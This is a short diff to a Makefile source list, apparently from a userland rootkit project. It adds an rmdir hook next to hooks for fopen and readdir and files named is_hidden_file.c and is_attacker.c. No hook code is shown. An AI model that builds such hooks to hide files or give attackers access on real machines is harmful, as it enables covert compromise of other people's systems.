@@ -23,6 +23,7 @@ SOURCES		= src/init.c \
 			  src/is_hidden_file.c \
 			  src/is_attacker.c \
 			  \
+			  src/hooks/rmdir.c \
 			  src/hooks/fopen.c \
 			  src/hooks/fopen64.c \
 			  src/hooks/readdir.c \
